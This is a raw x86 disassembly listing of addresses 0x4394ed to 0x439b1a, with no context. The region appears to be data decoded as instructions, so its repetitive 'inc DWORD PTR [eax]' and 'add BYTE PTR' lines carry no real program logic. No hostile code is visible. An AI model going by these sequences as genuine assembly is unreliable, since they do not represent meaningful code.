  4394ed:	inc    eax
  4394ee:	inc    DWORD PTR [eax]
  4394f0:	add    BYTE PTR [ebx],dh
  4394f2:	inc    DWORD PTR [eax]
  4394f4:	add    BYTE PTR ds:0x3e0000ff,ch
  4394fa:	inc    DWORD PTR [eax]
  4394fc:	add    BYTE PTR ds:0x430000ff,dh
  439502:	inc    DWORD PTR [eax]
  439504:	add    BYTE PTR [esi],dh
  439506:	inc    DWORD PTR [eax]
  439508:	add    BYTE PTR [edx],bh
  43950a:	inc    DWORD PTR [eax]
  43950c:	add    BYTE PTR [edi+edi*8],dh
  43950f:	add    BYTE PTR [eax],al
  439511:	xor    bh,bh
  439513:	add    BYTE PTR [eax],al
  439515:	cmp    edi,edi
  439517:	add    BYTE PTR [eax],al
  439519:	cmp    edi,edi
  43951b:	add    BYTE PTR [eax],al
  43951d:	inc    DWORD PTR ss:[eax]
  439520:	add    BYTE PTR [edx],bh
  439522:	inc    DWORD PTR [eax]
  439524:	add    BYTE PTR [edi],ah
  439526:	inc    DWORD PTR [eax]
  439528:	add    BYTE PTR [eax],dh
  43952a:	inc    DWORD PTR [eax]
  43952c:	add    BYTE PTR [edi],dh
  43952e:	inc    DWORD PTR [eax]
  439530:	add    BYTE PTR ds:0x3f0000ff,ch
  439536:	inc    DWORD PTR [eax]
  439538:	add    BYTE PTR [eax],bh
  43953a:	inc    DWORD PTR [eax]
  43953c:	add    BYTE PTR ds:0x270000ff,ch
  439542:	jmp    FWORD PTR [ecx]
  439544:	cmp    BYTE PTR es:[edx+eax*1+0xfe1702],ch
  43954c:	add    BYTE PTR [edi+edi*8],ah
  43954f:	add    BYTE PTR [eax],al
  439551:	inc    DWORD PTR es:[eax]
  439554:	add    BYTE PTR [esi],bl
  439556:	inc    DWORD PTR [eax]
  439558:	add    BYTE PTR [eax],bh
  43955a:	inc    DWORD PTR [eax]
  43955c:	add    BYTE PTR [eax],bh
  43955e:	inc    DWORD PTR [eax]
  439560:	add    BYTE PTR [edx],dh
  439562:	inc    DWORD PTR [eax]
  439564:	add    BYTE PTR [ebx],bh
  439566:	inc    DWORD PTR [eax]
  439568:	add    BYTE PTR [edi+edi*8+0x0],al
  43956c:	add    BYTE PTR [ebx],bh
  43956e:	inc    DWORD PTR [eax]
  439570:	add    BYTE PTR [edx],bh
  439572:	inc    DWORD PTR [eax]
  439574:	add    BYTE PTR [eax-0x1],cl
  439577:	add    BYTE PTR [eax],al
  439579:	xor    bh,bh
  43957b:	add    BYTE PTR [eax],al
  43957d:	and    al,0xff
  43957f:	add    BYTE PTR [eax],al
  439581:	daa    
  439582:	inc    DWORD PTR [eax]
  439584:	add    BYTE PTR [edi+edi*8],ah
  439587:	add    BYTE PTR [eax],al
  439589:	sbb    edi,edi
  43958b:	add    BYTE PTR [eax],al
  43958d:	aaa    
  43958e:	inc    DWORD PTR [eax]
  439590:	add    BYTE PTR [ecx],ch
  439592:	inc    DWORD PTR [eax]
  439594:	add    BYTE PTR [ebx],bh
  439596:	inc    DWORD PTR [eax]
  439598:	add    BYTE PTR [ebx],dh
  43959a:	inc    DWORD PTR [eax]
  43959c:	add    BYTE PTR [edx],ah
  43959e:	inc    DWORD PTR [eax]
  4395a0:	add    BYTE PTR [edx-0x1],al
  4395a3:	add    BYTE PTR [eax],al
  4395a5:	sub    bh,bh
  4395a7:	add    BYTE PTR [eax],al
  4395a9:	sub    bh,bh
  4395ab:	add    BYTE PTR [eax],al
  4395ad:	xor    bh,bh
  4395af:	add    BYTE PTR [eax],al
  4395b1:	sub    edi,edi
  4395b3:	add    BYTE PTR [eax],al
  4395b5:	inc    esp
  4395b6:	inc    DWORD PTR [eax]
  4395b8:	add    BYTE PTR [edi],dh
  4395ba:	inc    DWORD PTR [eax]
  4395bc:	add    BYTE PTR [ebx],ah
  4395be:	inc    DWORD PTR [eax]
  4395c0:	add    BYTE PTR [eax],dh
  4395c2:	inc    DWORD PTR [eax]
  4395c4:	add    BYTE PTR [ecx],bh
  4395c6:	inc    DWORD PTR [eax]
  4395c8:	add    BYTE PTR [edx],dh
  4395ca:	inc    DWORD PTR [eax]
  4395cc:	add    BYTE PTR [edi],ch
  4395ce:	inc    DWORD PTR [eax]
  4395d0:	add    BYTE PTR [edi+edi*8],ch
  4395d3:	add    BYTE PTR [eax],al
  4395d5:	cmp    al,0xff
  4395d7:	add    BYTE PTR [eax],al
  4395d9:	sub    edi,edi
  4395db:	add    BYTE PTR [eax],al
  4395dd:	inc    DWORD PTR cs:[eax]
  4395e0:	add    BYTE PTR [ebx],bh
  4395e2:	inc    DWORD PTR [eax]
  4395e4:	add    BYTE PTR [edx-0x1],al
  4395e7:	add    BYTE PTR [eax],al
  4395e9:	cmp    bh,bh
  4395eb:	add    BYTE PTR [eax],al
  4395ed:	daa    
  4395ee:	inc    DWORD PTR [eax]
  4395f0:	add    BYTE PTR [edi+edi*8],bh
  4395f3:	add    BYTE PTR [eax],al
  4395f5:	sbb    eax,0x430000ff
  4395fa:	inc    DWORD PTR [eax]
  4395fc:	add    BYTE PTR [ebx-0x1],al
  4395ff:	add    BYTE PTR [eax],al
  439601:	inc    esp
  439602:	inc    DWORD PTR [eax]
  439604:	add    BYTE PTR [edi-0x1],cl
  439607:	add    BYTE PTR [eax],al
  439609:	aaa    
  43960a:	inc    DWORD PTR [eax]
  43960c:	add    BYTE PTR [ebx],dh
  43960e:	inc    DWORD PTR [eax]
  439610:	add    BYTE PTR [edi-0x1],al
  439613:	add    BYTE PTR [eax],al
  439615:	dec    esp
  439616:	inc    DWORD PTR [eax]
  439618:	add    BYTE PTR [edi],bh
  43961a:	inc    DWORD PTR [eax]
  43961c:	add    BYTE PTR [edi+edi*8+0x0],dl
  439620:	add    BYTE PTR [edi-0x1],cl
  439623:	add    BYTE PTR [eax],al
  439625:	dec    eax
  439626:	inc    DWORD PTR [eax]
  439628:	add    BYTE PTR [edi+edi*8],bh
  43962b:	add    BYTE PTR [eax],al
  43962d:	dec    edi
  43962e:	inc    DWORD PTR [eax]
  439630:	add    BYTE PTR [ebp-0x1],al
  439633:	add    BYTE PTR [eax],al
  439635:	inc    esp
  439636:	inc    DWORD PTR [eax]
  439638:	add    BYTE PTR [ebx-0x1],al
  43963b:	add    BYTE PTR [eax],al
  43963d:	cmp    edi,edi
  43963f:	add    BYTE PTR [eax],al
  439641:	pop    edi
  439642:	inc    DWORD PTR [eax]
  439644:	add    BYTE PTR [edi+edi*8+0x0],ah
  439648:	add    BYTE PTR [ebx-0x1],bl
  43964b:	add    BYTE PTR [eax],al
  43964d:	dec    ebp
  43964e:	inc    DWORD PTR [eax]
  439650:	add    BYTE PTR [ebx-0x1],cl
  439653:	add    BYTE PTR [eax],al
  439655:	cmp    eax,0x470000ff
  43965a:	inc    DWORD PTR [eax]
  43965c:	add    BYTE PTR [ebx-0x1],cl
  43965f:	add    BYTE PTR [eax],al
  439661:	dec    eax
  439662:	inc    DWORD PTR [eax]
  439664:	add    BYTE PTR [eax-0x1],dl
  439667:	add    BYTE PTR [eax],al
  439669:	inc    esp
  43966a:	inc    DWORD PTR [eax]
  43966c:	add    BYTE PTR [edx-0x1],bl
  43966f:	add    BYTE PTR [eax],al
  439671:	pusha  
  439672:	inc    DWORD PTR [eax]
  439674:	add    BYTE PTR [edi-0x1],bl
  439677:	add    BYTE PTR [eax],al
  439679:	aas    
  43967a:	inc    DWORD PTR [eax]
  43967c:	add    BYTE PTR [ebp-0x1],cl
  43967f:	add    BYTE PTR [eax],al
  439681:	push   ebx
  439682:	inc    DWORD PTR [eax]
  439684:	add    BYTE PTR ds:0x340000ff,dh
  43968a:	inc    DWORD PTR [eax]
  43968c:	add    BYTE PTR [esi],ch
  43968e:	inc    DWORD PTR [eax]
  439690:	add    BYTE PTR [esi-0x1],al
  439693:	add    BYTE PTR [eax],al
  439695:	inc    edi
  439696:	inc    DWORD PTR [eax]
  439698:	add    BYTE PTR [ebp-0x1],al
  43969b:	add    BYTE PTR [eax],al
  43969d:	inc    DWORD PTR ss:[eax]
  4396a0:	add    BYTE PTR [ecx-0x1],cl
  4396a3:	add    BYTE PTR [eax],al
  4396a5:	dec    ebp
  4396a6:	inc    DWORD PTR [eax]
  4396a8:	add    BYTE PTR [edi+edi*8],bh
  4396ab:	add    BYTE PTR [eax],al
  4396ad:	dec    edi
  4396ae:	inc    DWORD PTR [eax]
  4396b0:	add    BYTE PTR [edi+edi*8+0x0],al
  4396b4:	add    BYTE PTR [ecx],bh
  4396b6:	inc    DWORD PTR [eax]
  4396b8:	add    BYTE PTR [edx],dh
  4396ba:	inc    DWORD PTR [eax]
  4396bc:	add    BYTE PTR [ecx],bh
  4396be:	inc    DWORD PTR [eax]
  4396c0:	add    BYTE PTR [edi+edi*8+0x0],al
  4396c4:	add    BYTE PTR [eax-0x1],al
  4396c7:	add    BYTE PTR [eax],al
  4396c9:	cmp    bh,bh
  4396cb:	add    BYTE PTR [eax],al
  4396cd:	cmp    bh,bh
  4396cf:	add    BYTE PTR [eax],al
  4396d1:	xor    edi,edi
  4396d3:	add    BYTE PTR [eax],al
  4396d5:	cmp    bh,bh
  4396d7:	add    BYTE PTR [eax],al
  4396d9:	inc    esp
  4396da:	inc    DWORD PTR [eax]
  4396dc:	add    BYTE PTR [edx],dh
  4396de:	inc    DWORD PTR [eax]
  4396e0:	add    BYTE PTR [ecx],bh
  4396e2:	inc    DWORD PTR [eax]
  4396e4:	add    BYTE PTR [edi+edi*8],bh
  4396e7:	add    BYTE PTR [eax],al
  4396e9:	dec    eax
  4396ea:	inc    DWORD PTR [eax]
  4396ec:	add    BYTE PTR [esi-0x1],al
  4396ef:	add    BYTE PTR [eax],al
  4396f1:	cmp    edi,edi
  4396f3:	add    BYTE PTR [eax],al
  4396f5:	xor    eax,0x3c0000ff
  4396fa:	inc    DWORD PTR [eax]
  4396fc:	add    BYTE PTR [eax-0x1],al
  4396ff:	add    BYTE PTR [eax],al
  439701:	inc    ecx
  439702:	inc    DWORD PTR [eax]
  439704:	add    BYTE PTR [edi+edi*8],dh
  439707:	add    BYTE PTR [eax],al
  439709:	xor    edi,edi
  43970b:	add    BYTE PTR [eax],al
  43970d:	cmp    edi,edi
  43970f:	add    BYTE PTR [eax],al
  439711:	xor    al,0xff
  439713:	add    BYTE PTR [eax],al
  439715:	xor    bh,bh
  439717:	add    BYTE PTR [eax],al
  439719:	inc    DWORD PTR es:[eax]
  43971c:	add    BYTE PTR [edx],dh
  43971e:	inc    DWORD PTR [eax]
  439720:	add    BYTE PTR [esi],dh
  439722:	inc    DWORD PTR [eax]
  439724:	add    BYTE PTR [ecx],dh
  439726:	inc    DWORD PTR [eax]
  439728:	add    BYTE PTR [eax-0x1],dl
  43972b:	add    BYTE PTR [eax],al
  43972d:	aaa    
  43972e:	inc    DWORD PTR [eax]
  439730:	add    BYTE PTR [ebx],ah
  439732:	inc    DWORD PTR [eax]
  439734:	add    BYTE PTR [ecx],bh
  439736:	inc    DWORD PTR [eax]
  439738:	add    BYTE PTR [ebx],dh
  43973a:	inc    DWORD PTR [eax]
  43973c:	add    BYTE PTR [edi],dh
  43973e:	inc    DWORD PTR [eax]
  439740:	add    BYTE PTR [edi+edi*8],ah
  439743:	push   ss
  439744:	adc    al,0x2a
  439746:	in     al,0x0
  439748:	add    BYTE PTR [eax],ah
  43974a:	inc    DWORD PTR [eax]
  43974c:	add    BYTE PTR [eax],bl
  43974e:	inc    DWORD PTR [eax]
  439750:	add    BYTE PTR ds:0x230000ff,ah
  439756:	inc    DWORD PTR [eax]
  439758:	add    BYTE PTR [edi+edi*8],bl
  43975b:	add    BYTE PTR [eax],al
  43975d:	sub    al,0xff
  43975f:	add    BYTE PTR [eax],al
  439761:	sbb    eax,0x130000ff
  439766:	inc    DWORD PTR [eax]
  439768:	add    BYTE PTR [edi+edi*8],ch
  43976b:	add    BYTE PTR [eax],al
  43976d:	inc    DWORD PTR cs:[eax]
  439770:	add    BYTE PTR [ecx],dh
  439772:	inc    DWORD PTR [eax]
  439774:	add    BYTE PTR [edx],dh
  439776:	inc    DWORD PTR [eax]
  439778:	add    BYTE PTR [edi+edi*8],bh
  43977b:	add    BYTE PTR [eax],al
  43977d:	inc    eax
  43977e:	inc    DWORD PTR [eax]
  439780:	add    BYTE PTR [edx],bh
  439782:	inc    DWORD PTR [eax]
  439784:	add    BYTE PTR [eax],dh
  439786:	inc    DWORD PTR [eax]
  439788:	add    BYTE PTR [edx],ch
  43978a:	inc    DWORD PTR [eax]
  43978c:	add    BYTE PTR [edi],ch
  43978e:	inc    DWORD PTR [eax]
  439790:	add    BYTE PTR [edi],bl
  439792:	inc    DWORD PTR [eax]
  439794:	add    BYTE PTR ds:0x310000ff,ah
  43979a:	inc    DWORD PTR [eax]
  43979c:	add    BYTE PTR [ebx],ch
  43979e:	inc    DWORD PTR [eax]
  4397a0:	add    BYTE PTR ds:0x260000ff,dh
  4397a6:	inc    DWORD PTR [eax]
  4397a8:	add    BYTE PTR ds:0x350000ff,dh
  4397ae:	inc    DWORD PTR [eax]
  4397b0:	add    BYTE PTR [esi],bh
  4397b2:	inc    DWORD PTR [eax]
  4397b4:	add    BYTE PTR [ebx],dh
  4397b6:	inc    DWORD PTR [eax]
  4397b8:	add    BYTE PTR [esi-0x1],al
  4397bb:	add    BYTE PTR [eax],al
  4397bd:	inc    edx
  4397be:	inc    DWORD PTR [eax]
  4397c0:	add    BYTE PTR [eax],dh
  4397c2:	inc    DWORD PTR [eax]
  4397c4:	add    BYTE PTR [edx],bh
  4397c6:	inc    DWORD PTR [eax]
  4397c8:	add    BYTE PTR [edx],ah
  4397ca:	inc    DWORD PTR [eax]
  4397cc:	add    BYTE PTR [ecx],dh
  4397ce:	inc    DWORD PTR [eax]
  4397d0:	add    BYTE PTR [eax],bh
  4397d2:	inc    DWORD PTR [eax]
  4397d4:	add    BYTE PTR [eax],dh
  4397d6:	inc    DWORD PTR [eax]
  4397d8:	add    BYTE PTR [ebx],dh
  4397da:	inc    DWORD PTR [eax]
  4397dc:	add    BYTE PTR [ecx],dh
  4397de:	inc    DWORD PTR [eax]
  4397e0:	add    BYTE PTR [ebx],ch
  4397e2:	inc    DWORD PTR [eax]
  4397e4:	add    BYTE PTR [edx-0x1],al
  4397e7:	add    BYTE PTR [eax],al
  4397e9:	inc    esp
  4397ea:	inc    DWORD PTR [eax]
  4397ec:	add    BYTE PTR [ebx],bh
  4397ee:	inc    DWORD PTR [eax]
  4397f0:	add    BYTE PTR [edi+edi*8],bh
  4397f3:	add    BYTE PTR [eax],al
  4397f5:	xor    al,0xff
  4397f7:	add    BYTE PTR [eax],al
  4397f9:	cmp    bh,bh
  4397fb:	add    BYTE PTR [eax],al
  4397fd:	xor    edi,edi
  4397ff:	add    BYTE PTR [eax],al
  439801:	inc    ebx
  439802:	inc    DWORD PTR [eax]
  439804:	add    BYTE PTR [edi+edi*8+0x0],cl
  439808:	add    BYTE PTR [esi-0x1],al
  43980b:	add    BYTE PTR [eax],al
  43980d:	push   esp
  43980e:	inc    DWORD PTR [eax]
  439810:	add    BYTE PTR [edi],bh
  439812:	inc    DWORD PTR [eax]
  439814:	add    BYTE PTR [ecx],bh
  439816:	inc    DWORD PTR [eax]
  439818:	add    BYTE PTR [edi+edi*8+0x0],al
  43981c:	add    BYTE PTR [esi],ch
  43981e:	inc    DWORD PTR [eax]
  439820:	add    BYTE PTR [ecx-0x1],dl
  439823:	add    BYTE PTR [eax],al
  439825:	push   ecx
  439826:	inc    DWORD PTR [eax]
  439828:	add    BYTE PTR [ebp-0x1],dl
  43982b:	add    BYTE PTR [eax],al
  43982d:	dec    ebx
  43982e:	inc    DWORD PTR [eax]
  439830:	add    BYTE PTR [eax],bh
  439832:	inc    DWORD PTR [eax]
  439834:	add    BYTE PTR [esi-0x1],dl
  439837:	add    BYTE PTR [eax],al
  439839:	dec    edx
  43983a:	inc    DWORD PTR [eax]
  43983c:	add    BYTE PTR [eax-0x1],al
  43983f:	add    BYTE PTR [eax],al
  439841:	cmp    al,0xff
  439843:	add    BYTE PTR [eax],al
  439845:	push   esp
  439846:	inc    DWORD PTR [eax]
  439848:	add    BYTE PTR [edi+edi*8],bh
  43984b:	add    BYTE PTR [eax],al
  43984d:	dec    eax
  43984e:	inc    DWORD PTR [eax]
  439850:	add    BYTE PTR [ebp-0x1],al
  439853:	add    BYTE PTR [eax],al
  439855:	inc    DWORD PTR gs:[eax]
  439858:	add    BYTE PTR [edi-0x1],al
  43985b:	add    BYTE PTR [eax],al
  43985d:	inc    esi
  43985e:	inc    DWORD PTR [eax]
  439860:	add    BYTE PTR [eax-0x1],ah
  439863:	add    BYTE PTR [eax],al
  439865:	inc    esi
  439866:	inc    DWORD PTR [eax]
  439868:	add    BYTE PTR [edx-0x1],bl
  43986b:	add    BYTE PTR [eax],al
  43986d:	pop    esp
  43986e:	inc    DWORD PTR [eax]
  439870:	add    BYTE PTR [esi-0x1],cl
  439873:	add    BYTE PTR [eax],al
  439875:	inc    DWORD PTR fs:[eax]
  439878:	add    BYTE PTR [ecx-0x1],al
  43987b:	add    BYTE PTR [eax],al
  43987d:	xor    eax,0x420000ff
  439882:	inc    DWORD PTR [eax]
  439884:	add    BYTE PTR [ecx-0x1],cl
  439887:	add    BYTE PTR [eax],al
  439889:	xor    edi,edi
  43988b:	add    BYTE PTR [eax],al
  43988d:	xor    eax,0x5b0000ff
  439892:	inc    DWORD PTR [eax]
  439894:	add    BYTE PTR [eax-0x1],bl
  439897:	add    BYTE PTR [eax],al
  439899:	inc    esi
  43989a:	inc    DWORD PTR [eax]
  43989c:	add    BYTE PTR [esi-0x1],al
  43989f:	add    BYTE PTR [eax],al
  4398a1:	xor    edi,edi
  4398a3:	add    BYTE PTR [eax],al
  4398a5:	inc    DWORD PTR ss:[eax]
  4398a8:	add    BYTE PTR [edi+edi*8],bh
  4398ab:	add    BYTE PTR [eax],al
  4398ad:	inc    esp
  4398ae:	inc    DWORD PTR [eax]
  4398b0:	add    BYTE PTR [ebx],dh
  4398b2:	inc    DWORD PTR [eax]
  4398b4:	add    BYTE PTR [eax],bh
  4398b6:	inc    DWORD PTR [eax]
  4398b8:	add    BYTE PTR [ebx-0x1],cl
  4398bb:	add    BYTE PTR [eax],al
  4398bd:	cmp    edi,edi
  4398bf:	add    BYTE PTR [eax],al
  4398c1:	cmp    bh,bh
  4398c3:	add    BYTE PTR [eax],al
  4398c5:	cmp    al,0xff
  4398c7:	add    BYTE PTR [eax],al
  4398c9:	cmp    edi,edi
  4398cb:	add    BYTE PTR [eax],al
  4398cd:	cmp    edi,edi
  4398cf:	add    BYTE PTR [eax],al
  4398d1:	aas    
  4398d2:	inc    DWORD PTR [eax]
  4398d4:	add    BYTE PTR [edi],dh
  4398d6:	inc    DWORD PTR [eax]
  4398d8:	add    BYTE PTR [edi],dh
  4398da:	inc    DWORD PTR [eax]
  4398dc:	add    BYTE PTR [ecx],bh
  4398de:	inc    DWORD PTR [eax]
  4398e0:	add    BYTE PTR [ebx],bh
  4398e2:	inc    DWORD PTR [eax]
  4398e4:	add    BYTE PTR [eax],dh
  4398e6:	inc    DWORD PTR [eax]
  4398e8:	add    BYTE PTR [ecx-0x1],al
  4398eb:	add    BYTE PTR [eax],al
  4398ed:	cmp    edi,edi
  4398ef:	add    BYTE PTR [eax],al
  4398f1:	cmp    edi,edi
  4398f3:	add    BYTE PTR [eax],al
  4398f5:	cmp    bh,bh
  4398f7:	add    BYTE PTR [eax],al
  4398f9:	sub    eax,0x460000ff
  4398fe:	inc    DWORD PTR [eax]
  439900:	add    BYTE PTR [esi],bh
  439902:	inc    DWORD PTR [eax]
  439904:	add    BYTE PTR [ecx],ch
  439906:	inc    DWORD PTR [eax]
  439908:	add    BYTE PTR [edi],ch
  43990a:	inc    DWORD PTR [eax]
  43990c:	add    BYTE PTR [ecx],bh
  43990e:	inc    DWORD PTR [eax]
  439910:	add    BYTE PTR [ecx],dh
  439912:	inc    DWORD PTR [eax]
  439914:	add    BYTE PTR [edx-0x1],al
  439917:	add    BYTE PTR [eax],al
  439919:	xor    bh,bh
  43991b:	add    BYTE PTR [eax],al
  43991d:	xor    al,0xff
  43991f:	add    BYTE PTR [eax],al
  439921:	xor    al,0xff
  439923:	add    BYTE PTR [eax],al
  439925:	inc    ecx
  439926:	inc    DWORD PTR [eax]
  439928:	add    BYTE PTR [eax],dh
  43992a:	inc    DWORD PTR [eax]
  43992c:	add    BYTE PTR [edx],bh
  43992e:	inc    DWORD PTR [eax]
  439930:	add    BYTE PTR [edi],bl
  439932:	inc    DWORD PTR [eax]
  439934:	add    BYTE PTR [ebx],bh
  439936:	inc    DWORD PTR [eax]
  439938:	add    BYTE PTR [ecx],dh
  43993a:	inc    DWORD PTR [eax]
  43993c:	add    BYTE PTR [edx],dh
  43993e:	inc    DWORD PTR [eax]
  439940:	add    BYTE PTR [edi],ah
  439942:	dec    DWORD PTR [eax]
  439944:	pop    es
  439945:	and    edi,esi
  439947:	add    BYTE PTR [eax],al
  439949:	sbb    bh,bh
  43994b:	add    BYTE PTR [eax],al
  43994d:	push   ss
  43994e:	inc    DWORD PTR [eax]
  439950:	add    BYTE PTR [edi],dl
  439952:	inc    DWORD PTR [eax]
  439954:	add    BYTE PTR [ebx],ch
  439956:	inc    DWORD PTR [eax]
  439958:	add    BYTE PTR [edi+edi*8],dh
  43995b:	add    BYTE PTR [eax],al
  43995d:	and    edi,edi
  43995f:	add    BYTE PTR [eax],al
  439961:	push   ds
  439962:	inc    DWORD PTR [eax]
  439964:	add    BYTE PTR [ebx],ch
  439966:	inc    DWORD PTR [eax]
  439968:	add    BYTE PTR [edi+edi*8],bl
  43996b:	add    BYTE PTR [eax],al
  43996d:	and    bh,bh
  43996f:	add    BYTE PTR [eax],al
  439971:	pop    ds
  439972:	inc    DWORD PTR [eax]
  439974:	add    BYTE PTR ds:0x1b0000ff,bl
  43997a:	inc    DWORD PTR [eax]
  43997c:	add    BYTE PTR [edx],ch
  43997e:	inc    DWORD PTR [eax]
  439980:	add    BYTE PTR [edi+edi*8+0x0],al
  439984:	add    BYTE PTR ds:0x400000ff,bh
  43998a:	inc    DWORD PTR [eax]
  43998c:	add    BYTE PTR ds:0x310000ff,bh
  439992:	inc    DWORD PTR [eax]
  439994:	add    BYTE PTR [edi],bh
  439996:	inc    DWORD PTR [eax]
  439998:	add    BYTE PTR [ecx-0x1],al
  43999b:	add    BYTE PTR [eax],al
  43999d:	cmp    bh,bh
  43999f:	add    BYTE PTR [eax],al
  4399a1:	dec    ebx
  4399a2:	inc    DWORD PTR [eax]
  4399a4:	add    BYTE PTR [ecx],dh
  4399a6:	inc    DWORD PTR [eax]
  4399a8:	add    BYTE PTR [edx],ch
  4399aa:	inc    DWORD PTR [eax]
  4399ac:	add    BYTE PTR [edi],ah
  4399ae:	inc    DWORD PTR [eax]
  4399b0:	add    BYTE PTR [edx],ch
  4399b2:	inc    DWORD PTR [eax]
  4399b4:	add    BYTE PTR [ecx],ah
  4399b6:	inc    DWORD PTR [eax]
  4399b8:	add    BYTE PTR [edi],bh
  4399ba:	inc    DWORD PTR [eax]
  4399bc:	add    BYTE PTR ds:0x320000ff,bh
  4399c2:	inc    DWORD PTR [eax]
  4399c4:	add    BYTE PTR [eax-0x1],al
  4399c7:	add    BYTE PTR [eax],al
  4399c9:	xor    eax,0x2e0000ff
  4399ce:	inc    DWORD PTR [eax]
  4399d0:	add    BYTE PTR [ecx],dh
  4399d2:	inc    DWORD PTR [eax]
  4399d4:	add    BYTE PTR [esi],bh
  4399d6:	inc    DWORD PTR [eax]
  4399d8:	add    BYTE PTR [edi],bh
  4399da:	inc    DWORD PTR [eax]
  4399dc:	add    BYTE PTR [ecx],ch
  4399de:	inc    DWORD PTR [eax]
  4399e0:	add    BYTE PTR [ebx],bh
  4399e2:	inc    DWORD PTR [eax]
  4399e4:	add    BYTE PTR ds:0x3d0000ff,bh
  4399ea:	inc    DWORD PTR [eax]
  4399ec:	add    BYTE PTR [edi],dh
  4399ee:	inc    DWORD PTR [eax]
  4399f0:	add    BYTE PTR [edi],ch
  4399f2:	inc    DWORD PTR [eax]
  4399f4:	add    BYTE PTR [ecx],ch
  4399f6:	inc    DWORD PTR [eax]
  4399f8:	add    BYTE PTR [esi],bh
  4399fa:	inc    DWORD PTR [eax]
  4399fc:	add    BYTE PTR [eax],bh
  4399fe:	inc    DWORD PTR [eax]
  439a00:	add    BYTE PTR [edi+edi*8+0x0],cl
  439a04:	add    BYTE PTR [eax-0x1],al
  439a07:	add    BYTE PTR [eax],al
  439a09:	das    
  439a0a:	inc    DWORD PTR [eax]
  439a0c:	add    BYTE PTR [ebx-0x1],bl
  439a0f:	add    BYTE PTR [eax],al
  439a11:	cmp    bh,bh
  439a13:	add    BYTE PTR [eax],al
  439a15:	xor    bh,bh
  439a17:	add    BYTE PTR [eax],al
  439a19:	xor    edi,edi
  439a1b:	add    BYTE PTR [eax],al
  439a1d:	sub    bh,bh
  439a1f:	add    BYTE PTR [eax],al
  439a21:	cmp    al,0xff
  439a23:	add    BYTE PTR [eax],al
  439a25:	inc    edx
  439a26:	inc    DWORD PTR [eax]
  439a28:	add    BYTE PTR [esi],bh
  439a2a:	inc    DWORD PTR [eax]
  439a2c:	add    BYTE PTR ds:0x590000ff,bh
  439a32:	inc    DWORD PTR [eax]
  439a34:	add    BYTE PTR [edi+edi*8+0x0],bl
  439a38:	add    BYTE PTR [edi-0x1],dl
  439a3b:	add    BYTE PTR [eax],al
  439a3d:	cmp    bh,bh
  439a3f:	add    BYTE PTR [eax],al
  439a41:	cmp    al,0xff
  439a43:	add    BYTE PTR [eax],al
  439a45:	dec    edi
  439a46:	inc    DWORD PTR [eax]
  439a48:	add    BYTE PTR [ecx-0x1],cl
  439a4b:	add    BYTE PTR [eax],al
  439a4d:	push   eax
  439a4e:	inc    DWORD PTR [eax]
  439a50:	add    BYTE PTR [ebx-0x1],cl
  439a53:	add    BYTE PTR [eax],al
  439a55:	cmp    eax,0x430000ff
  439a5a:	inc    DWORD PTR [eax]
  439a5c:	add    BYTE PTR [edi+edi*8],bh
  439a5f:	add    BYTE PTR [eax],al
  439a61:	pop    ecx
  439a62:	inc    DWORD PTR [eax]
  439a64:	add    BYTE PTR [ecx-0x1],al
  439a67:	add    BYTE PTR [eax],al
  439a69:	dec    ecx
  439a6a:	inc    DWORD PTR [eax]
  439a6c:	add    BYTE PTR [ebx-0x1],cl
  439a6f:	add    BYTE PTR [eax],al
  439a71:	inc    DWORD PTR ds:[eax]
  439a74:	add    BYTE PTR [eax-0x1],ah
  439a77:	add    BYTE PTR [eax],al
  439a79:	dec    ebx
  439a7a:	inc    DWORD PTR [eax]
  439a7c:	add    BYTE PTR [eax-0x1],al
  439a7f:	add    BYTE PTR [eax],al
  439a81:	push   eax
  439a82:	inc    DWORD PTR [eax]
  439a84:	add    BYTE PTR [eax-0x1],cl
  439a87:	add    BYTE PTR [eax],al
  439a89:	cmp    bh,bh
  439a8b:	add    BYTE PTR [eax],al
  439a8d:	inc    esi
  439a8e:	inc    DWORD PTR [eax]
  439a90:	add    BYTE PTR [eax],bh
  439a92:	inc    DWORD PTR [eax]
  439a94:	add    BYTE PTR [ecx],bh
  439a96:	inc    DWORD PTR [eax]
  439a98:	add    BYTE PTR [esi-0x1],al
  439a9b:	add    BYTE PTR [eax],al
  439a9d:	push   eax
  439a9e:	inc    DWORD PTR [eax]
  439aa0:	add    BYTE PTR [edi+edi*8+0x0],cl
  439aa4:	add    BYTE PTR [edi+edi*8],bh
  439aa7:	add    BYTE PTR [eax],al
  439aa9:	inc    esp
  439aaa:	inc    DWORD PTR [eax]
  439aac:	add    BYTE PTR [edx],bh
  439aae:	inc    DWORD PTR [eax]
  439ab0:	add    BYTE PTR [edi],dh
  439ab2:	inc    DWORD PTR [eax]
  439ab4:	add    BYTE PTR [edi+edi*8+0x0],dl
  439ab8:	add    BYTE PTR [esi-0x1],al
  439abb:	add    BYTE PTR [eax],al
  439abd:	inc    edx
  439abe:	inc    DWORD PTR [eax]
  439ac0:	add    BYTE PTR [edi+edi*8+0x0],cl
  439ac4:	add    BYTE PTR [edi],dh
  439ac6:	inc    DWORD PTR [eax]
  439ac8:	add    BYTE PTR [edi],dh
  439aca:	inc    DWORD PTR [eax]
  439acc:	add    BYTE PTR [edx],dh
  439ace:	inc    DWORD PTR [eax]
  439ad0:	add    BYTE PTR [edi+edi*8],bh
  439ad3:	add    BYTE PTR [eax],al
  439ad5:	inc    esp
  439ad6:	inc    DWORD PTR [eax]
  439ad8:	add    BYTE PTR [esi],bh
  439ada:	inc    DWORD PTR [eax]
  439adc:	add    BYTE PTR [ecx],bh
  439ade:	inc    DWORD PTR [eax]
  439ae0:	add    BYTE PTR [eax-0x1],al
  439ae3:	add    BYTE PTR [eax],al
  439ae5:	sub    al,0xff
  439ae7:	add    BYTE PTR [eax],al
  439ae9:	sub    eax,0x420000ff
  439aee:	inc    DWORD PTR [eax]
  439af0:	add    BYTE PTR [eax],bh
  439af2:	inc    DWORD PTR [eax]
  439af4:	add    BYTE PTR [ecx],ch
  439af6:	inc    DWORD PTR [eax]
  439af8:	add    BYTE PTR [edi+edi*8],dh
  439afb:	add    BYTE PTR [eax],al
  439afd:	sub    edi,edi
  439aff:	add    BYTE PTR [eax],al
  439b01:	xor    bh,bh
  439b03:	add    BYTE PTR [eax],al
  439b05:	xor    bh,bh
  439b07:	add    BYTE PTR [eax],al
  439b09:	cmp    edi,edi
  439b0b:	add    BYTE PTR [eax],al
  439b0d:	cmp    al,0xff
  439b0f:	add    BYTE PTR [eax],al
  439b11:	sub    bh,bh
  439b13:	add    BYTE PTR [eax],al
  439b15:	xor    eax,0x280000ff
  439b1a:	inc    DWORD PTR [eax]
